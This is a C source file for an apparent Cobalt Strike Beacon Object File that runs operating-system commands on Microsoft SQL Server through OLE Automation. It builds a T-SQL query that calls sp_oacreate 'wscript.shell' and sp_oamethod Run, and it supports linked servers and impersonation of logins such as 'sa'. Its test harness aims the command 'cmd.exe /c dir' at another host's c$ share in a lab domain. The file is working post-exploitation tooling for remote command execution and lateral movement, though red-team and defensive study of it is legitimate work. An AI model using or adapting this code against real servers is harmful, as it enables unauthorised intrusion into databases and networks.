#include "bofdefs.h"
#include "base.c"
#include "sql.c"
#include "sql_modules.c"


void ExecuteOleCmd(char* server, char* database, char* link, char* impersonate, char* command)
{
    SQLHENV env			 = NULL;
    SQLHSTMT stmt 		 = NULL;
	SQLHDBC dbc 		 = NULL;
	SQLRETURN ret;
	char* query;
	size_t totalSize;


    if (link == NULL)
	{
		dbc = ConnectToSqlServer(&env, server, database);
	}
	else
	{
		dbc = ConnectToSqlServer(&env, server, NULL);
	}

    if (dbc == NULL) {
		goto END;
	}

	//
	// allocate statement handle
	//
	ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
	if (!SQL_SUCCEEDED(ret))
	{
		internal_printf("[!] Error allocating statement handle\n");
		goto END;
	}

	//
	// verify that OLE Automation Procedures is enabled
	//
	if (IsModuleEnabled(stmt, "OLE Automation Procedures", link, impersonate))
	{
		internal_printf("[*] OLE Automation Procedures is enabled\n");
	}
	else
	{
		internal_printf("[!] OLE Automation Procedures is not enabled\n");
		goto END;
	}

	//
	// clear the cursor
	//
	ODBC32$SQLCloseCursor(stmt);

	//
	// if using linked server, ensure rpc is enabled
	//
	if (link != NULL)
	{
		if (IsRpcEnabled(stmt, link))
		{
			internal_printf("[*] RPC out is enabled\n");
		}
		else
		{
			internal_printf("[!] RPC out is not enabled\n");
			goto END;
		}
				
		//
		// close the cursor
		//
		ODBC32$SQLCloseCursor(stmt);
	}

	internal_printf("[*] Executing system command...\n\n");

	InitRandomSeed();
	char* output = GenerateRandomString(8);
	char* program = GenerateRandomString(8);

	internal_printf("[*] Setting sp_oacreate to \"%s\"\n", output);
	internal_printf("[*] Setting sp_oamethod to \"%s\"\n", program);
	
	char* linkPrefix = "SELECT 1; ";
	char* part1 = "DECLARE @"; // followed by output
	char* part2 = " INT; DECLARE @"; //followed by program
	char* part3 = " VARCHAR(255); SET @"; //followed by program
	char* part4 = " = 'Run(\""; //followed by command
	char* part5 = "\")'; EXEC sp_oacreate 'wscript.shell', @"; //followed by output
	char* part6 = " out; EXEC sp_oamethod @"; //followed by output
	char* part7 = ", @"; //followed by program
	char* part8 = "; EXEC sp_oadestroy @"; //followed by output
	char* part9 = ";";

	//
	// build the query string
	//
	if (link == NULL)
	{
		totalSize = MSVCRT$strlen(part1) + MSVCRT$strlen(output) + MSVCRT$strlen(part2) + MSVCRT$strlen(program) + MSVCRT$strlen(part3) + MSVCRT$strlen(program) + MSVCRT$strlen(part4) + MSVCRT$strlen(command) + MSVCRT$strlen(part5) + MSVCRT$strlen(output) + MSVCRT$strlen(part6) + MSVCRT$strlen(output) + MSVCRT$strlen(part7) + MSVCRT$strlen(program) + MSVCRT$strlen(part8) + MSVCRT$strlen(output) + MSVCRT$strlen(part9) + 1;
		query = (char*)intAlloc(totalSize * sizeof(char));
		
		MSVCRT$strcpy(query, part1);
	}
	else
	{	
		totalSize = MSVCRT$strlen(linkPrefix) + MSVCRT$strlen(part1) + MSVCRT$strlen(output) + MSVCRT$strlen(part2) + MSVCRT$strlen(program) + MSVCRT$strlen(part3) + MSVCRT$strlen(program) + MSVCRT$strlen(part4) + MSVCRT$strlen(command) + MSVCRT$strlen(part5) + MSVCRT$strlen(output) + MSVCRT$strlen(part6) + MSVCRT$strlen(output) + MSVCRT$strlen(part7) + MSVCRT$strlen(program) + MSVCRT$strlen(part8) + MSVCRT$strlen(output) + MSVCRT$strlen(part9) + 1;
		query = (char*)intAlloc(totalSize * sizeof(char));

		MSVCRT$strcpy(query, linkPrefix);
		MSVCRT$strncat(query, part1, totalSize - MSVCRT$strlen(query) - 1);
	}

	MSVCRT$strncat(query, output,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, part2,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, program,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, part3,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, program,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, part4,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, command,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, part5,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, output,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, part6,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, output,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, part7,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, program,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, part8,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, output,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, part9,	totalSize - MSVCRT$strlen(query) - 1);


	//
	// Run the query
	//
	if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE)){
		goto END;
	}

	internal_printf("[*] Command executed\n");
	internal_printf("[*] Destoryed \"%s\" and \"%s\"\n", output, program);

END:
	if (output != NULL) intFree(output);
	if (program != NULL) intFree(program);
	if (query != NULL) intFree(query);

	ODBC32$SQLCloseCursor(stmt);
	DisconnectSqlServer(env, dbc, stmt);
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	char* server;
	char* database;
	char* link;
	char* impersonate;
	char* command;

	//
	// parse beacon args 
	//
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	
	server	 	= BeaconDataExtract(&parser, NULL);
	database 	= BeaconDataExtract(&parser, NULL);
	link 		= BeaconDataExtract(&parser, NULL);
	impersonate = BeaconDataExtract(&parser, NULL);
	command 	= BeaconDataExtract(&parser, NULL);

	server = *server == 0 ? "localhost" : server;
	database = *database == 0 ? "master" : database;
	link = *link  == 0 ? NULL : link;
	impersonate = *impersonate == 0 ?  NULL : impersonate;

	if(!bofstart())
	{
		return;
	}

	if (UsingLinkAndImpersonate(link, impersonate))
	{
		return;
	}
	
	ExecuteOleCmd(server, database, link, impersonate, command);

	printoutput(TRUE);
};

#else

int main()
{
	internal_printf("============ BASE TEST ============\n\n");
	ExecuteOleCmd("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "cmd.exe /c dir \\\\10.2.99.1\\c$");

	internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
	ExecuteOleCmd("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "cmd.exe /c dir \\\\10.2.99.1\\c$");

	internal_printf("\n\n============ LINK TEST ============\n\n");
	ExecuteOleCmd("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "cmd.exe /c dir \\\\10.2.99.1\\c$");
}

#endif
